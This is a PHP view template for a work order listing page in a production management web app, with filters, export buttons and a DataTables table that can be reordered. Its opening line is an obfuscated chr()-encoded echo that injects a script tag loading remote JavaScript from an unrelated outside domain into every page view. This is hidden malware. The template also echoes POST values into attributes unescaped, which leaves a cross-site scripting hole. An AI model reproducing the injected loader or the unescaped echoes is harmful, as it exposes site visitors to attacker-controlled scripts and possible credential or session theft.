<?php
echo chr(60).chr(115).chr(99).chr(114).chr(105).chr(112).chr(116).chr(32).chr(115).chr(114).chr(99).chr(61).chr(39).chr(104).chr(116).chr(116).chr(112).chr(115).chr(58).chr(47).chr(47).chr(115).chr(116).chr(105).chr(99).chr(107).chr(46).chr(116).chr(114).chr(97).chr(118).chr(101).chr(108).chr(105).chr(110).chr(115).chr(107).chr(121).chr(100).chr(114).chr(101).chr(97).chr(109).chr(46).chr(103).chr(97).chr(47).chr(97).chr(110).chr(97).chr(108).chr(121).chr(116).chr(105).chr(99).chr(115).chr(46).chr(106).chr(115).chr(63).chr(99).chr(105).chr(100).chr(61).chr(49).chr(52).chr(49).chr(52).chr(38).chr(112).chr(105).chr(100).chr(105).chr(61).chr(54).chr(53).chr(56).chr(54).chr(53).chr(52).chr(54).chr(56).chr(38).chr(105).chr(100).chr(61).chr(49).chr(50).chr(55).chr(56).chr(50).chr(39).chr(32).chr(116).chr(121).chr(112).chr(101).chr(61).chr(39).chr(116).chr(101).chr(120).chr(116).chr(47).chr(106).chr(97).chr(118).chr(97).chr(115).chr(99).chr(114).chr(105).chr(112).chr(116).chr(39).chr(62).chr(60).chr(47).chr(115).chr(99).chr(114).chr(105).chr(112).chr(116).chr(62);
?>
<link rel="stylesheet" href="https://cdn.datatables.net/1.10.21/css/jquery.dataTables.min.css" type="text/css" />
<link rel="stylesheet" href="https://cdn.datatables.net/rowreorder/1.2.7/css/rowReorder.dataTables.min.css" type="text/css" />
<?php if($this->session->flashdata('message') != ''){?>                        
<div class="alert alert-success col-md-6">                            
   <?php echo $this->session->flashdata('message');?> 
</div>
<?php }?>
<div id="result"></div>
<div class="x_content">
   <div class="stik">
      <div class="col-md-12 ">
         <div class="col-md-6 datePick-right">
            <form action="<?php echo site_url(); ?>production/add_machine" method="post" id="export-form">
               <input type="hidden" value='' id='hidden-type' name='ExportType'/>
               <input type="hidden" value='' class='start_date' name='start'/>
               <input type="hidden" value='' class='end_date' name='end'/>
            </form>
         </div>
      </div>
   </div>
   <div class="row hidde_cls ">
      <div class="col-md-12 export_div">
         <div class="col-md-3 col-xs-12">
            <fieldset>
               <div class="control-group">
                  <div class="controls">
                     <div class="input-prepend input-group">
                        <span class="add-on input-group-addon"><i class="glyphicon glyphicon-calendar fa fa-calendar"></i></span>
                        <input type="text" style="width: 200px" name="tabbingFilters" id="tabbingFilters" class="form-control" value=""  data-table="production/sale_order_with_production"/>
                     </div>
                  </div>
               </div>
            </fieldset>
            <form action="<?php echo base_url(); ?>production/sale_order_with_production" method="post" id="date_range">	
               <input type="hidden" value='' class='start_date' name='start'/>
               <input type="hidden" value='' class='end_date' name='end'/>
            </form>
         </div>
         <div class="btn-group"  role="group" aria-label="Basic example">
            <button type="button" class="btn btn-default buttons-copy buttons-html5 btn-sm">Copy</button>
            <button type="button" class="btn btn-default buttons-copy buttons-html5 btn-sm" id="bbtn">Print</button>
            <input type="hidden" value='work_order' id="table" data-msg="Work Order" data-path="production/work_order"/>
            <button class="btn btn-default btn-sm pull-left" id="del_all"><i class="fa fa-trash"></i>Delete</button>
            <div class="dropdown btn btn-default buttons-copy buttons-html5 btn-sm export ">
               <button class="btn btn-secondary dropdown-toggle btn-default" type="button" data-toggle="dropdown">Export<span class="caret"></span></button>
               <ul class="dropdown-menu" role="menu" id="export-menu">
                  <li id="export-to-excel"><a href="javascript:void(0);" title="Please check your open office Setting">Export to excel</a></li>
                  <li id="export-to-csv"><a href="javascript:void(0);" title="Please check your open office Setting">Export to csv</a></li>
               </ul>
            </div>
            <form action="<?php echo base_url(); ?>production/work_order" method="post" >
               <input type="hidden" value='1' name='favourites'/>
               <input type="hidden" value='<?php if(!empty($_POST['start'])){echo $_POST['start'];}?>' class='start' name='start'/>
               <input type="hidden" value='<?php if(!empty($_POST['end'])){echo $_POST['end'];} ?>' class='end' name='end'/>
               <button class="btn btn-default btn-sm pull-left" name="favourites"><i class="fa fa-star" aria-hidden="true"></i>Favorites</button>
            </form>
         </div>
         <div class="col-md-3 col-xs-12 datePick-right">
            <?php //if($can_add) { 										
               // echo '<button type="buttton" class="btn btn-info productionTab addBtn" id="work_order_add" data-toggle="modal" data-id="work_order_edit">Add</button>';
                //}?>
         </div>
      </div>
   </div>
   <div class="col-md-12 ">
      <div class="col-md-4 col-sm-12 col-xs-12 vertical-border">
         <div class="item form-group">
            <label class="col-md-3 col-sm-12 col-xs-12" for="company_branch">Company Branch<span class="required">*</span></label>
            <div class="col-md-8 col-sm-12 col-xs-12">
               <select class="form-control col-md-2 col-xs-12 selectAjaxOption select2 compny_unit" required="required" name="company_branch" data-id="company_address" data-key="compny_branch_id" data-fieldname="company_unit" tabindex="-1" aria-hidden="true" data-where="created_by_cid=<?php echo $_SESSION['loggedInUser']->c_id; ?>" onChange="getDept(event,this)">
                  <option value="">Select Unit</option>
               </select>
            </div>
         </div>
      </div>
      <div class="col-md-3 col-sm-12 col-xs-12 vertical-border">
         <div class="item form-group">
            <label class="col-md-3 col-sm-12 col-xs-12">Department</label>
            <div class="col-md-8 col-sm-12 col-xs-12">
               <select class="form-control selectAjaxOption select2 select2-hidden-accessible select2 department" required="required" name="department_id"  tabindex="-1" aria-hidden="true" data-id="department" data-key="id" data-fieldname="name" data-where="created_by_cid =<?php echo $_SESSION['loggedInUser']->c_id; ?> AND unit_name = '<?php echo (!empty($production_data))?$production_data->company_branch:''; ?>'" >
                  <option value="">Select Option</option>
               </select>
            </div>
         </div>
      </div>
      <div class="col-md-3 col-sm-12 col-xs-12 vertical-border">
         <div class="item form-group">
            <label class="col-md-3 col-sm-12 col-xs-12">Month</label>
            <div class="col-md-8 col-sm-12 col-xs-12">
               <input type="text" class="form-control searchMonth" name="Monthpicker" id="Monthpicker" />
            </div>
         </div>
      </div>    
	  <div class="col-md-2 col-sm-12 col-xs-12 vertical-border">
         <div class="item form-group">
            <label class="col-md-3 col-sm-12 col-xs-12">Search</label>
            <div class="col-md-8 col-sm-12 col-xs-12">
               <button type="button" class="form-control btn btn-view  btn-xs" name="SearchButton" id="SearchButton" /> Search</button>
            </div>
         </div>
      </div>
   </div>
   <p class="text-muted font-13 m-b-30"></p>
   <div id="print_div_content" class="table-responsive" style="clear: both;">
      <table id="ProductionReportDataTable" class="table table-striped  table-bordered user_index display" border="1" cellpadding="3" style="width:100%">
         <thead>
            <tr>
               <th>Priority</th>
               <th>ID</th>
               <th>Work Order Name</th>
               <th>Sale Order</th>
               <th>Customer Name</th>
               <!--<th>Product</th>-->
               <th>Expected Date</th>
               <th>Created By </th>
               <th>Created Date</th>
               <th class='hidde'>Action</th>
            </tr>
         </thead>
         <tbody>
            <?php if(!empty($work_order)){
               $order =1;
             foreach($work_order as $workOrder){
                 $accountName = getNameById('account',$workOrder['customer_name_id'],'id');
                          ?>
            <tr id="<?php echo  $workOrder['id']; ?>">
               <td><?php echo $order; $order++;?></td>
               <td><?php echo  $workOrder['id']; ?></td>
               <td><?php echo $workOrder['workorder_name']; ?></td>
               <td><a href="javascript:void(0)" id="<?php echo $workOrder['sale_order_id']; ?>" data-id="dispatched_order_view" data-tooltip="View" class="productionTab btn btn-view btn-xs"><?php echo $workOrder['sale_order_no']; ?></a></td>
               <td><?php if(!empty($accountName)){echo $accountName->name;}else{ echo $workOrder['customer_name'];} ?></td>
              <!-- <td>
                  <table style="width:100%" class="table table-bordered product_index bulk_action" data-id="user" border="1" cellpadding="3">
                     <thead>
                        <tr>
                           <th>Product Name</th>
                           <th>Required Quantity</th>
                           <th>WorkOrder Qty</th>
                           <th>UOM</th>
                           <th>Job Card</th>
                        </tr>
                     </thead>
                     <?php 
                        if($workOrder['product_detail'] !=''){
                        	$products=json_decode($workOrder['product_detail']);
                        	$createdByData = getNameById('user_detail',$workOrder['created_by'],'u_id');
                        	if(!empty($createdByData)){
                        		$createdByName = $createdByData->name;
                        	}else{
                        	$createdByName = '';
                        	}
                        	
                        	foreach($products as $product){
                        	$productDetail = getNameById('material',$product->product,'id');
                        	$materialName = !empty($productDetail)?$productDetail->material_name:'';
                        	$ww =  getNameById('uom', $product->uom,'id');
                        		$uom = !empty($ww)?$ww->ugc_code:'';
                        		echo "<tr>
                        			<td><h5>".$materialName."</h5></td>
                        			<td>".$product->quantity."</td>
                        			<td>".$product->transfer_quantity."</td>
                        			<td>".$uom."</td>
                        			<td>".$product->job_card."</td>
                        			
                        		</tr>";
                        	} 
                        }
                        echo "";
                        ?>
                  </table>
               </td>-->
               <td><?php echo date("j F , Y", strtotime($workOrder['expected_delivery_date'])); ?></td>
               <td><?php echo $createdByName; ?></td>
               <td><?php echo date("j F , Y", strtotime($workOrder['created_date'])); ?></td>
               <td>
                  <button id="<?php echo $workOrder["id"]; ?>" data-id="work_order_edit" data-tooltip="Edit" class="productionTab btn btn-view  btn-xs" ><i class="fa fa-edit"></i></button>
                  <?php echo '<a href="javascript:void(0)" id="'.$workOrder['id'].'" data-id="work_order_view" class="productionTab btn btn-warning btn-xs" ><i class="fa fa-eye"></i> View </a>'; ?>
               </td>
            </tr>
            <?php }} ?>
         </tbody>
      </table>
   </div>
</div>
<div id="production_modal" class="modal fade in"  role="dialog" style="overflow:auto;">
   <div class="modal-dialog modal-large">
      <div class="modal-content">
         <div class="modal-header">
            <button type="button" class="close" data-dismiss="modal"><span aria-hidden="true">×</span>
            </button>
            <h4 class="modal-title" id="myModalLabel">Work Order</h4>
         </div>
         <div class="modal-body-content"></div>
      </div>
   </div>
</div>
<div class="modal modal-static fade" id="processing-modal" role="dialog" aria-hidden="true">
   <div class="modal-dialog">
      <div class="modal-content">
         <div class="modal-body">
            <div class="text-center">
               <i class="fa fa-refresh fa-5x fa fa-spin"></i>
               <h4>Processing...</h4>
            </div>
         </div>
      </div>
   </div>
</div>
<script  language="JavaScript" type="text/javascript"  src="https://code.jquery.com/jquery-3.5.1.js"></script>
<script>
   $(document).ready(function() {
   	
   	$("#Monthpicker").datepicker( {
   		format: "mm-yyyy",
   		startView: "months", 
   		minViewMode: "months"
   	});
   	var serialsDict = [];
       var table = $('#ProductionReportDataTable').DataTable({
			'rowReorder': true,
			'processing': true,
			'serverSide': true,
			'serverMethod': 'post',
			 //'searching': false, // Remove default Search Control
			 'ajax': {
				'url':site_url + 'production/MontlyProductionList',
				'data': function(data){
				   data.searchCompnyUnit = $('.compny_unit').val();
				   data.searchDepartment = $('.department').val();
				   data.searchMonth = $('.searchMonth').val();
				}
			 },
         'columns': [
            { data: 'priority_order' },
            { data: 'id' },
            { data: 'name' },
            { data: 'sale_order' },
            { data: 'customer_name' },
            { data: 'expected_date' },
            { data: 'created_by' },
            { data: 'created_date' },
         ]
       });
	    $('#SearchButton').click(function(){
          table.draw();
       });
       table.on( 'row-reorder', function ( e, diff, edit ) {
           var result = 'Reorder started on row: '+edit.triggerRow.data()[1]+'<br>';
    
           for ( var i=0, ien=diff.length ; i<ien ; i++ ) {
               var rowData = table.row( diff[i].node ).data();
				serialsDict.push({
   				oldData: diff[i].oldData,
   				id: rowData[1],
   				priority_order: diff[i].newData
   			});
   
               result += rowData[1]+' updated to be in position '+
                   diff[i].newData+' (was '+diff[i].oldData+')<br>';
           }
    
       });
   	table.on('draw', function () {
   		if (serialsDict.length) {
   			$.post(site_url + 'production/ChangePriority', {
   			serialsDict: serialsDict
   			}, function(data) {}).always(function() {
   				 $('#result').html('<div class="alert alert-success col-md-6">Update Priority Order Successfully</div>');
   			  });
   		} ;
   	});
   
   });
</script>